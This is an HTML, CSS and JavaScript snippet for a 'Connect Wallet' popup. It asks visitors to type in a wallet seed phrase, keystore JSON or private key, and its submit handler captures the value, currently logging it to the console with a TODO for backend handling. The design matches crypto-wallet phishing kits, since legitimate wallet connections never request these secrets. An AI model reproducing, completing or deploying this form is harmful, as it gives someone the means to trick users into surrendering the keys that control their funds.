<div id="walletPopup" class="popup-overlay">
  <div class="popup-box">
    <h2 id="popupTitle">Connect Wallet</h2>

    <div class="input-toggle">
      <button type="button" class="toggle-btn active" data-input="phrase">Phrase</button>
      <button type="button" class="toggle-btn" data-input="keystore">Keystore JSON</button>
      <button type="button" class="toggle-btn" data-input="privateKey">Private Key</button>
    </div>

    <form id="walletForm">
      <div class="input-group" id="phraseGroup">
        <label for="phrase">Seed Phrase</label>
        <textarea id="phrase" name="phrase" placeholder="Enter your wallet seed phrase"></textarea>
      </div>

      <div class="input-group" id="keystoreGroup" style="display: none;">
        <label for="keystore">Keystore JSON</label>
        <textarea id="keystore" name="keystore" placeholder="Paste your keystore JSON here"></textarea>
      </div>

      <div class="input-group" id="privateKeyGroup" style="display: none;">
        <label for="privateKey">Private Key</label>
        <input type="text" id="privateKey" name="privateKey" placeholder="Enter your private key" />
      </div>

      <button type="submit">Submit</button>
    </form>
    <button class="close-btn" onclick="closePopup()">✖</button>
  </div>
</div>


<style>
    .popup-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0,0,0,0.5);
  display: none;
  justify-content: center;
  align-items: center;
  z-index: 1000;
  padding: 20px;
}

.popup-box {
  background: #fff;
  padding: 30px;
  width: 400px;
  max-width: 90%;
  border-radius: 8px;
  box-shadow: 0 0 15px rgba(0,0,0,0.3);
  position: relative;
  transition: all 0.3s ease;
}

.popup-box h2 {
  margin-top: 0;
  font-size: 24px;
  margin-bottom: 20px;
  text-align: center;
}

.input-toggle {
  display: flex;
  justify-content: center;
  margin-bottom: 20px;
  flex-wrap: wrap;
}

.toggle-btn {
  background: #f2f2f2;
  border: none;
  padding: 10px 15px;
  margin: 5px;
  border-radius: 4px;
  cursor: pointer;
  font-weight: bold;
  font-size: 14px;
  transition: all 0.3s ease;
}

.toggle-btn.active {
  background: #007bff;
  color: #fff;
}

.input-group {
  margin-bottom: 15px;
}

.input-group label {
  display: block;
  margin-bottom: 5px;
  font-weight: bold;
}

.input-group input,
.input-group textarea {
  width: 100%;
  padding: 10px;
  font-size: 14px;
  border: 1px solid #ddd;
  border-radius: 4px;
  resize: vertical;
}

.popup-box button[type="submit"] {
  width: 100%;
  background: #007bff;
  color: #fff;
  border: none;
  padding: 12px;
  font-size: 16px;
  border-radius: 4px;
  cursor: pointer;
}

.close-btn {
  position: absolute;
  top: 10px;
  right: 15px;
  background: transparent;
  border: none;
  font-size: 24px;
  cursor: pointer;
  color: #333;
}

/* RESPONSIVENESS */
@media (max-width: 480px) {
  .popup-box {
    width: 100%;
    max-width: 100%;
    padding: 20px;
  }
  .popup-box h2 {
    font-size: 20px;
  }
  .toggle-btn {
    font-size: 12px;
    padding: 8px 10px;
  }
}

</style>

<script>
// Toggle inputs
document.querySelectorAll('.toggle-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    // Remove active from all buttons
    document.querySelectorAll('.toggle-btn').forEach(b => b.classList.remove('active'));

    // Add active to this button
    btn.classList.add('active');

    // Hide all input groups
    document.querySelectorAll('.input-group').forEach(group => {
      group.style.display = 'none';
    });

    // Show selected group
    const selected = btn.getAttribute('data-input');
    document.getElementById(selected + 'Group').style.display = 'block';
  });
});

// Popup show/hide
function showPopup(walletName) {
  document.getElementById('popupTitle').innerText = `Connect to ${walletName}`;
  document.getElementById('walletPopup').style.display = 'flex';
}

function closePopup() {
  document.getElementById('walletPopup').style.display = 'none';
}

// Optional: form handling
document.getElementById('walletForm').addEventListener('submit', function(e) {
  e.preventDefault();

  let inputType;
  let value;

  if (document.getElementById('phraseGroup').style.display !== 'none') {
    inputType = 'phrase';
    value = document.getElementById('phrase').value.trim();
  } else if (document.getElementById('keystoreGroup').style.display !== 'none') {
    inputType = 'keystore';
    value = document.getElementById('keystore').value.trim();
  } else if (document.getElementById('privateKeyGroup').style.display !== 'none') {
    inputType = 'privateKey';
    value = document.getElementById('privateKey').value.trim();
  }

  console.log('Selected input type:', inputType);
  console.log('Value:', value);

  // TODO: handle your backend logic here
});

</script>

</script>
